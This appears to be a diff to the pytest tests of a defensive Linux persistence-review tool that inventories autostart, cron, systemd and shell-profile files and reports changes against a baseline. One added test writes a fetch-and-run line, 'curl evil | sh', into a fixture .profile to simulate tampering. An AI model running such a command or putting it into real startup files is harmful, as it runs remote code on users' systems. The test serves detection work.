@@ -3,6 +3,7 @@ import base64
 import hashlib
 import json
 import os
+from pathlib import Path
 import subprocess
 
 import pytest
@@ -50,7 +51,7 @@ def manager(tree):
 
 def test_inventory_hashes_files_redacts_arguments_and_drops_key_comments(tree):
     home, root = tree
-    items, gaps, stopped = inventory(home, root)
+    items, gaps, coverage = inventory(home, root)
     by_path = {row['path']: row for row in items}
     desktop = by_path[str(home/'.config/autostart/updater.desktop')]
     assert desktop['category'] == 'autostart' and desktop['attack'] == 'T1547.013'
@@ -84,7 +85,7 @@ def test_reads_and_listings_are_bounded(tree):
     (home/'.profile').write_bytes(b'x' * (MAX_READ + 10))
     for index in range(MAX_DIR_ENTRIES + 5):
         (root/'etc/cron.d'/f'job{index:04d}').write_text('')
-    items, gaps, stopped = inventory(home, root)
+    items, gaps, coverage = inventory(home, root)
     profile = next(r for r in items if r['path'] == str(home/'.profile'))
     assert profile['truncated'] is True and profile['bytes'] == MAX_READ + 10
     assert sum(r['path'].startswith(str(root/'etc/cron.d')) for r in items) == MAX_DIR_ENTRIES
@@ -101,8 +102,8 @@ def test_item_bound_stops_file_reads_inside_a_location(tree, monkeypatch):
     reads = []
     original = persistence_review._read
     monkeypatch.setattr(persistence_review, '_read', lambda path: reads.append(path) or original(path))
-    items, gaps, stopped = inventory(home, root)
-    assert len(items) == MAX_ITEMS and len(reads) <= MAX_ITEMS and stopped is True
+    items, gaps, coverage = inventory(home, root)
+    assert len(items) == MAX_ITEMS and len(reads) <= MAX_ITEMS and coverage['stopped'] is True
     assert gaps[0].startswith(f'Review stopped at {MAX_ITEMS} items')
 
 
@@ -136,7 +137,7 @@ def test_baseline_then_added_changed_and_removed(tree):
     assert ('REMOVED', str(root/'etc/cron.d/job')) in found
     assert result['baseline_at'] == NOW
     detail = next(f['detail'] for f in result['findings'] if f['path'] == str(home/'.bashrc'))
-    assert detail == 'Changed since the recorded baseline: sha256.'
+    assert detail == 'Changed since the recorded baseline: sha256, bytes.'
 
 
 def test_unexpected_owner_uses_the_reviewing_account():
@@ -190,10 +191,10 @@ def test_nested_unit_directory_overflow_is_reported(tree):
     wants = root/'etc/systemd/system/multi-user.target.wants'
     for index in range(MAX_DIR_ENTRIES + 3):
         (wants/f'z{index:04d}.service').write_text('')
-    items, gaps, stopped = inventory(home, root)
+    items, gaps, coverage = inventory(home, root)
     label = '/etc/systemd/system/multi-user.target.wants'
     assert f'{label} has {MAX_DIR_ENTRIES + 4} entries; only the first {MAX_DIR_ENTRIES} were reviewed.' in gaps
-    assert sum(r['path'].startswith(str(wants)) for r in items) == MAX_DIR_ENTRIES and stopped is False
+    assert sum(r['path'].startswith(str(wants)) for r in items) == MAX_DIR_ENTRIES and coverage['stopped'] is False
 
 
 def test_fixed_file_locations_respect_the_item_bound(tree, monkeypatch):
@@ -203,8 +204,8 @@ def test_fixed_file_locations_respect_the_item_bound(tree, monkeypatch):
     reads = []
     original = persistence_review._read
     monkeypatch.setattr(persistence_review, '_read', lambda path: reads.append(path) or original(path))
-    items, gaps, stopped = inventory(home, root)
-    assert len(items) == 3 and len(reads) <= 3 and stopped is True
+    items, gaps, coverage = inventory(home, root)
+    assert len(items) == 3 and len(reads) <= 3 and coverage['stopped'] is True
     assert str(root/'etc/ld.so.preload') not in {r['path'] for r in items}
     assert gaps[0].startswith('Review stopped at 3 items')
 
@@ -227,3 +228,63 @@ def test_findings_beyond_the_cap_are_counted_and_disclosed(tree, monkeypatch):
     assert len(result['findings']) == persistence_review.MAX_FINDINGS
     assert result['findings_total'] == persistence_review.MAX_FINDINGS + 6 and result['findings_truncated'] is True
     assert result['gaps'][0] == f'{persistence_review.MAX_FINDINGS + 6} findings were found; only the first {persistence_review.MAX_FINDINGS} are listed.'
+
+
+def test_displaced_or_unlisted_baseline_paths_are_unconfirmed_not_removed(tree, monkeypatch):
+    home, root = tree
+    monkeypatch.setattr(persistence_review, 'MAX_DIR_ENTRIES', 3)
+    cron = root/'etc/cron.d'
+    for name in ('b', 'c', 'd'):
+        (cron/name).write_text('')
+    review = manager(tree)
+    review.record_baseline()
+    (cron/'a').write_text('')  # displaces 'd' from the bounded listing
+    result = review.review()
+    rules = {(f['rule'], f['path']) for f in result['findings']}
+    assert ('ADDED', str(cron/'a')) in rules
+    assert not any(rule == 'REMOVED' for rule, _ in rules)
+    assert str(cron) in result['incomplete_locations']
+    assert any('not fully reviewed; they are not reported as removed' in gap for gap in result['gaps'])
+    original = persistence_review._names
+    def unlistable(path):
+        if Path(path) == cron:
+            raise PermissionError('denied')
+        return original(path)
+    monkeypatch.setattr(persistence_review, '_names', unlistable)
+    result = review.review()
+    assert not any(f['rule'] == 'REMOVED' for f in result['findings'])
+    assert '/etc/cron.d could not be listed.' in result['gaps']
+
+
+def test_gap_list_overflow_is_disclosed_and_baseline_warning_kept(tree, monkeypatch):
+    home, root = tree
+    monkeypatch.setattr(persistence_review, 'MAX_GAPS', 3)
+    for unit in range(4):
+        (root/'etc/systemd/system'/f'u{unit}.d').mkdir()
+    original = persistence_review._names
+    def unlistable(path):
+        if str(path).endswith('.d') and 'systemd' in str(path):
+            raise PermissionError('denied')
+        return original(path)
+    monkeypatch.setattr(persistence_review, '_names', unlistable)
+    result = manager(tree).review()
+    assert len(result['gaps']) == 3 and result['gaps_truncated'] is True and result['gaps_total'] > 3
+    assert result['gaps'][0].startswith('No baseline is recorded')
+    assert result['gaps'][-1] == f"{result['gaps_total'] - 2} more coverage gaps were not listed."
+
+
+def test_changes_past_the_hashed_prefix_are_reported(tree):
+    home, root = tree
+    profile = home/'.profile'
+    profile.write_bytes(b'x' * (MAX_READ + 10))
+    review = manager(tree)
+    review.record_baseline()
+    profile.write_bytes(b'x' * (MAX_READ + 10) + b'\ncurl evil | sh\n')
+    detail = next(f['detail'] for f in review.review()['findings'] if f['path'] == str(profile))
+    assert 'bytes' in detail and 'sha256' not in detail
+    review.record_baseline()
+    stamp = profile.stat().st_mtime
+    profile.write_bytes(b'x' * (MAX_READ + 10) + b'\ncurl good | sh\n')  # same size, same prefix
+    os.utime(profile, (stamp + 120, stamp + 120))
+    detail = next(f['detail'] for f in review.review()['findings'] if f['path'] == str(profile))
+    assert detail == 'Changed since the recorded baseline: modified_at.'
